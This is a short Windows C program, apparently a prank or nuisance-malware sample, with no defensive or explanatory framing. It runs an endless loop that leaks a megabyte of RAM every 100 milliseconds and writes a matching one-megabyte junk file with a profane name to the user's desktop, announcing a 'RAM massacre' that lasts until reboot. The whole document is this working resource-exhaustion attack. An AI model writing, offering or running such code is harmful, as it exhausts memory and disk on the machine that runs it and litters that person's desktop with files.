#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>

#define CHUNK_SIZE (1024 * 1024)  // 1MB chunks for memory allocation
#define FILE_SIZE (1024 * 1024)   // 1MB files for desktop clutter

int main() {
    size_t file_count = 0;

    // Get the desktop path
    char desktop_path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop_path);
    printf("Desktop path: %s\n", desktop_path);
    
    printf("Starting the RAM massacre. This will run until you reboot.\n");

    while (1) {
        // Allocate a chunk of RAM
        void *chunk = malloc(CHUNK_SIZE);
        if (chunk) {
            memset(chunk, 69, CHUNK_SIZE);  // Fill memory with data
        } else {
            printf("Failed to allocate more memory.\n");
        }

        // Create a file on the desktop
        char filename[256];
        sprintf(filename, "%s\\fuckfile_%zu.txt", desktop_path, file_count++);
        FILE *file = fopen(filename, "wb");
        if (file) {
            char *buffer = malloc(FILE_SIZE);
            if (buffer) {
                memset(buffer, 'X', FILE_SIZE);  // Fill buffer with 'X'
                fwrite(buffer, 1, FILE_SIZE, file);
                free(buffer);
            }
            fclose(file);
        } else {
            printf("Failed to create file: %s\n", filename);
        }

        printf("Files created: %zu\n", file_count);

        Sleep(100);  // 100ms delay to stretch out the chaos
    }

    return 0;
}
